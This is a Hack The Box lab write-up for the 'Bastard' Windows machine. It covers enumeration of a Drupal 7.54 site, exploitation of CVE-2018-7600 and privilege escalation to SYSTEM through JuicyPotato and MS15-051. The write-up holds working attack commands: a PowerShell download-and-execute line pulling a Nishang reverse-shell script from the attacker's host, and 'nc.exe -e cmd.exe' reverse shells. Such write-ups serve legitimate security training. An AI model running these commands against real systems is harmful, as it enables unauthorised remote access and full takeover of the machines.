## Default Information
IP Address: 10.10.10.9\
OS: Windows

## Discovery

Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.

```
10.10.10.9    bastard.htb
```
### Masscan
Firstly, we will use masscan to identify the open ports

```
┌──(kali㉿kali)-[~]
└─$ sudo masscan -p1-65535,U:1-65535 10.10.10.9 --rate=1000 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-03-26 05:43:42 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 49154/tcp on 10.10.10.9                                   
Discovered open port 80/tcp on 10.10.10.9                                      
Discovered open port 135/tcp on 10.10.10.9   
```

### Nmap
We will then use the open ports obtained from masscan to run a scan using nmap to enumerate the services operating behind each port

| Port Number | Service | Version | State |
|-----|------------------|----------------------|----------------------|
| 80	| http | Microsoft IIS httpd 7.5 | Open |
| 135	| msrpc | Microsoft Windows RPC | Open |
| 49154	| msrpc | Microsoft Windows RPC | Open |

From the nmap output, we can also see that port 80 is running on Drupal service from the http-generator

```
http-generator: Drupal 7 (http://drupal.org)
```

### Web Enumeration
First, we will use gobuster to enumerate possible endpoints on http://bastard.htb

```
http://10.10.10.9:80/0                    (Status: 200) [Size: 7646]
http://10.10.10.9:80/changelog.txt        (Status: 200) [Size: 110781]
http://10.10.10.9:80/INDEX.php            (Status: 200) [Size: 7646]
http://10.10.10.9:80/install.mysql.txt    (Status: 200) [Size: 1717]
http://10.10.10.9:80/install.php          (Status: 200) [Size: 3189]
http://10.10.10.9:80/license.txt          (Status: 200) [Size: 18092]
http://10.10.10.9:80/maintainers.txt      (Status: 200) [Size: 8710]
http://10.10.10.9:80/Misc                 (Status: 301) [Size: 149] [--> http://10.10.10.9:80/Misc/]
http://10.10.10.9:80/modules              (Status: 301) [Size: 152] [--> http://10.10.10.9:80/modules/]
http://10.10.10.9:80/Profiles             (Status: 301) [Size: 153] [--> http://10.10.10.9:80/Profiles/]
http://10.10.10.9:80/readMe.txt           (Status: 200) [Size: 5382]
http://10.10.10.9:80/Scripts              (Status: 301) [Size: 152] [--> http://10.10.10.9:80/Scripts/]
http://10.10.10.9:80/sites                (Status: 301) [Size: 150] [--> http://10.10.10.9:80/sites/]
http://10.10.10.9:80/Sites                (Status: 301) [Size: 150] [--> http://10.10.10.9:80/Sites/]
http://10.10.10.9:80/Themes               (Status: 301) [Size: 151] [--> http://10.10.10.9:80/Themes/]
http://10.10.10.9:80/UPGRADE.txt          (Status: 200) [Size: 10123]
http://10.10.10.9:80/xmlrpc.php           (Status: 200) [Size: 42]
```

Visiting http://bastard.htb/changelog.txt, we are able to know that we are using Drupal 7.54

![Drupal Version](https://github.com/joelczk/writeups/blob/main/HTB/Images/Bastard/drupal_version.png)

Next, we will use ```droopescan``` to enumerate the website and find for potential vulnerabilities related to Drupal.

```
┌──(HTB)─(kali㉿kali)-[~/Desktop]
└─$ droopescan scan drupal -u http://10.10.10.9 -t 50 
[+] Plugins found:                                                              
    ctools http://10.10.10.9/sites/all/modules/ctools/
        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.txt
        http://10.10.10.9/sites/all/modules/ctools/changelog.txt
        http://10.10.10.9/sites/all/modules/ctools/CHANGELOG.TXT
        http://10.10.10.9/sites/all/modules/ctools/LICENSE.txt
        http://10.10.10.9/sites/all/modules/ctools/API.txt
    libraries http://10.10.10.9/sites/all/modules/libraries/
        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.txt
        http://10.10.10.9/sites/all/modules/libraries/changelog.txt
        http://10.10.10.9/sites/all/modules/libraries/CHANGELOG.TXT
        http://10.10.10.9/sites/all/modules/libraries/README.txt
        http://10.10.10.9/sites/all/modules/libraries/readme.txt
        http://10.10.10.9/sites/all/modules/libraries/README.TXT
        http://10.10.10.9/sites/all/modules/libraries/LICENSE.txt
    services http://10.10.10.9/sites/all/modules/services/
        http://10.10.10.9/sites/all/modules/services/README.txt
        http://10.10.10.9/sites/all/modules/services/readme.txt
        http://10.10.10.9/sites/all/modules/services/README.TXT
        http://10.10.10.9/sites/all/modules/services/LICENSE.txt
    profile http://10.10.10.9/modules/profile/
    php http://10.10.10.9/modules/php/
    image http://10.10.10.9/modules/image/

[+] Themes found:
    seven http://10.10.10.9/themes/seven/
    garland http://10.10.10.9/themes/garland/

[+] Possible version(s):
    7.54

[+] Possible interesting urls found:
    Default changelog file - http://10.10.10.9/CHANGELOG.txt
    Default admin - http://10.10.10.9/user/login

[+] Scan finished (0:49:22.915847 elapsed)
```

## Exploit
### CVE-2018-7600
With some research, we are able to find out that Drupal 7.54 is vulnerable to CVE-2018-7600, whih is a remote code execution vulnerability.

Next, we will modify the InvokePowerShellTcp.ps1 script from Nishang so that we can invoke a reverse shell by adding the following line to the end of the ps1 script.

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 4000
```

Finally, we will download the exploit script from [here](https://github.com/pimps/CVE-2018-7600), and we can execute the exploit script to obtain a reverse shell

```
┌──(HTB)─(kali㉿kali)-[~/Desktop/bastard/CVE-2018-7600]
└─$ python3 drupa7-CVE-2018-7600.py http://bastard.htb/ -c "powershell.exe iex(new-object net.webclient).downloadString('http://10.10.16.3:3000/Invoke-PowerShellTcp.ps1')"

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-WBcjKTPltNYBweVkmnGbD5QQIhZtcSwfIhe8hIcAbho
[*] Triggering exploit to execute: powershell.exe iex(new-object net.webclient).downloadString('http://10.10.16.3:3000/Invoke-PowerShellTcp.ps1')
```
### Obtaining reverse shell
![Obtaining reverse shell](https://github.com/joelczk/writeups/blob/main/HTB/Images/Bastard/rev_shell.png)
### Obtaining user flag
```
PS C:\Users\dimitris\Desktop> type user.txt
<Redacted User flag>
```

### Privilege Escalation to system administrator

Checking the privileges of the nt authority\iusr on the server, we realize that this user has SeImpersonatePrivilege. This means that this server might be vulnerable to Juicy Potato exploit.
```
PS C:\inetpub\drupal-7.54> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled
```

However, the Juicy Potato exploit only affects several version of Windows. Let us first check the version of Windows that this server is on.

```
PS C:\inetpub\drupal-7.54> systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
```

From [here](https://kb.iweb.com/hc/en-us/articles/360037049372-Juicy-Potato-Windows-Vulnerability), we can see that Windows Server 2008 R2 is affected by JuicyPotato exploit.

Now, we will transfer nc.exe to our server so that we can do a reverse shell later on. Afterwards, we will also download the Juicy Potato exploit from [here](https://github.com/ohpe/juicy-potato/releases) and transfer it to our server as well.

Next, we will attempt to do the JuicyPotato exploit. However for this exploit, we might need to experiment with the CLSID to find a workable CLSID that can be exploited. We can get the list of CLSID from [here](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_Server_2008_R2_Enterprise)

Eventually, we are able to find a CLSID ```9B1F122C-2982-4e91-AA8B-E071D54F2A4D``` that can be exploited.

```
C:\inetpub\drupal-7.54>JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p "c:\windows\system32\cmd.exe" -a "/c nc.exe -e cmd.exe 10.10.16.13 2000" -t *
JuicyPotato.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p "c:\windows\system32\cmd.exe" -a "/c nc.exe -e cmd.exe 10.10.16.13 2000" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
COM -> recv failed with error: 10038
====================================================================================================================================
C:\inetpub\drupal-7.54>JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p "c:\windows\system32\cmd.exe" -a "/c C:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.16.3 2000" -t *
JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -p "c:\windows\system32\cmd.exe" -a "/c C:\inetpub\drupal-7.54\nc.exe -e cmd.exe 10.10.16.3 2000" -t *
Testing {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} 1337
....
[+] authresult 0
{9B1F122C-2982-4e91-AA8B-E071D54F2A4D};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW O
```

We are then able to obtain a reverse shell with ```nt authority\system``` privileges

```
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 2000
listening on [any] 2000 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.9] 49328
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```
### Obtaining root flag

```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
<Redacted root flag>
```

## Post Exploitation
### Privilege Escalation by MS15-051
Using Sherlock.ps1 to scan for potential kernal exploits, we realize that the server might also be vulnerable to MS15-051.

```
Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Appears Vulnerable
```

We can download the exploit from [here](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/MS15-051-KB3045171.zip). However since this server is a 64-bit Windows server, we will need to download the 64-bit version of the exploit from the zip file. 

Afterwards, we will transfer the exploit to the server and we can easily do our privilege escalation

```
PS C:\inetpub\drupal-7.54> ./ms15-051x64.exe "whoami"
[#] ms15-051 fixed by zcgonvh
[!] process with pid: 2160 created.
==============================
nt authority\system
PS C:\inetpub\drupal-7.54> 
```
